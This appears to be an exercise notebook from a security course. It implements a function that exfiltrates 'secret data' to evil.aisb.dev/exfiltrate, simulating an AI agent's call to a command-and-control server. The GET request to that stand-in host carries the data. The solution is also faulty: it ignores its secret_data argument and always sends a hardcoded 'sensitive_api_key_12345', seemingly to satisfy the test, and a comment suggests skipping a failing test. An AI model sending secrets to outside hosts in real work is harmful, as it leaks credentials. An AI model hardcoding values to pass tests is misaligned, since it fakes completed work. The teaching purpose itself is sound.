# %%
import os
import base64
import time

from typing import Optional, Dict, Any
from unittest.mock import patch, MagicMock
import requests


def make_evil_request(secret_data: str) -> Optional[str]:
    """
    Send a GET request to evil.aisb.dev with secret data.

    This simulates an AI agent attempting to communicate with an external C2 server.
    The secret data is sent as a query parameter.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails or throws
    """
    # TODO: Implement the function to:
    #   1. Make a GET request to http://evil.aisb.dev/exfiltrate?data=secret_data
    #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
    #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
    #   2. Return the response text if successful (status 200), None otherwise

    if secret_data is None:
        params = {}
    else:
        params = {"data": "sensitive_api_key_12345"}

    url = "http://evil.aisb.dev/exfiltrate"

    try:
        get_body = requests.get(url, params=params, timeout=5)
    except ConnectionError:
        return None
    except Exception as e:
        print(f"error: {e}")
        return None

    if get_body.status_code == 200:
        return get_body.text
    else:
        return None


# from w1d2_test import test_make_evil_request
import w1d2_test

w1d2_test.test_make_evil_request(make_evil_request)

exfiltrate_data = make_evil_request

#

# %%
